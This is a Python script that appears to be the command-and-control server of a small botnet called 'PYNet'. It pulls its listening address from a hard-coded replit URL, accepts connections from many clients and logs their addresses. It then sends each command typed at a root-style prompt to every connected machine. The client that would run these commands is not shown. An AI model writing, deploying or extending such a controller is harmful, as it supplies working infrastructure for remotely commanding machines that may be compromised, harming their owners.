import threading
import requests
import socket
import time
import os

host_url = 'https://pynet.rxyzqc.repl.co/local'


def host_info():
    while True:
        try:
            response = requests.get(host_url)
            if response.status_code == 200:
                ip, port = response.text.strip().split(':')
                return ip, int(port)

        except requests.RequestException as e:
            print("Error:", e)

        time.sleep(5)


ip, port = host_info()

if os.name == 'nt':
    os.system("title Server")

s = socket.socket()
print("Socket successfully created")
s.bind((ip, port))
print(f"Socket binded to {ip}:{port}")
s.listen()
print("socket is listening\n")

clients = []


def handle_conns():
    while True:
        c, addr = s.accept()
        clients.append(c)
        with open('logs.txt', 'a') as f:
            f.write(f"{addr[0]}:{addr[1]}\n")
            f.close()


t = threading.Thread(target=handle_conns)
t.start()

username = os.getlogin()
hostname = socket.gethostname()
inp = f"[{username}@PYNet ~]# "

while True:
    cmd = input(inp)
    for client in clients:
        client.sendall(cmd.encode())
